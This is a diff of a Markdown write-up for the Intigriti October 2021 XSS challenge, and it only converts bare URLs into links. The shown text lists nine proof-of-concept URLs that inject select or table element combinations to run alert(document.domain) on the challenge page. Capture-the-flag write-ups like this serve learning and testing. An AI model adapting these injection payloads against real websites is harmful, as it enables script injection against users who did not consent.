@@ -2,7 +2,7 @@
 
 ## Target
 
-The challenge is hosted at https://challenge-1021.intigriti.io, and the tweet about it is https://twitter.com/intigriti/status/1452596778130452483.
+The challenge is hosted at [https://challenge-1021.intigriti.io](https://challenge-1021.intigriti.io), and the tweet about it is [https://twitter.com/intigriti/status/1452596778130452483](https://twitter.com/intigriti/status/1452596778130452483).
 
 As stated on the challenge's page, we need to find a way to execute arbitrary JavaScript on the challenge page. However, there are a few rules and information:
 
@@ -28,7 +28,7 @@ The solution...
 
 ```
 
-(taken from https://challenge-1021.intigriti.io / 2021-10-28 18:00 CET)
+(taken from [https://challenge-1021.intigriti.io](https://challenge-1021.intigriti.io) / 2021-10-28 18:00 CET)
 
 ## Hints
 
@@ -513,12 +513,12 @@ let run = 0;
 
 Since that is not quite performant, fuzzing through the ~23000 combinations takes a while. I though there would be more results coming out, but in total I found 9 combinations of two HTML elements leading to XSS:
 
-- select->optgroup: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Coptgroup%3E//%20%3C/optgroup%3E&xss=%0aalert(document.domain)
-- select->option: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Coption%3E//%20%3C/option%3E&xss=%0aalert(document.domain)
-- select->script: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Cscript%3E//%20%3C/script%3E&xss=%0aalert(document.domain)
-- select->template: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Ctemplate%3E//%20%3C/template%3E&xss=%0aalert(document.domain)
-- table->caption: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ccaption%3E//%20%3C/caption%3E&xss=%0aalert(document.domain)
-- table->script: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Cscript%3E//%20%3C/script%3E&xss=%0aalert(document.domain)
-- table->style: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Cstyle%3E//%20%3C/style%3E&xss=%0aalert(document.domain)
+- select->optgroup: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Coptgroup%3E//%20%3C/optgroup%3E&xss=%0aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Coptgroup%3E//%20%3C/optgroup%3E&xss=%0aalert(document.domain))
+- select->option: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Coption%3E//%20%3C/option%3E&xss=%0aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Coption%3E//%20%3C/option%3E&xss=%0aalert(document.domain))
+- select->script: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Cscript%3E//%20%3C/script%3E&xss=%0aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Cscript%3E//%20%3C/script%3E&xss=%0aalert(document.domain))
+- select->template: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Ctemplate%3E//%20%3C/template%3E&xss=%0aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Ctemplate%3E//%20%3C/template%3E&xss=%0aalert(document.domain))
+- table->caption: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ccaption%3E//%20%3C/caption%3E&xss=%0aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ccaption%3E//%20%3C/caption%3E&xss=%0aalert(document.domain))
+- table->script: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Cscript%3E//%20%3C/script%3E&xss=%0aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Cscript%3E//%20%3C/script%3E&xss=%0aalert(document.domain))
+- table->style: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Cstyle%3E//%20%3C/style%3E&xss=%0aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Cstyle%3E//%20%3C/style%3E&xss=%0aalert(document.domain))
 - table->template: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ctemplate%3E//%20%3C/template%3E&xss=%0aalert(document.domain)
-- table->tr: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ctr%3E//%20%3C/tr%3E&xss=%0aalert(document.domain)
+- table->tr: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ctr%3E//%20%3C/tr%3E&xss=%0aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ctr%3E//%20%3C/tr%3E&xss=%0aalert(document.domain))
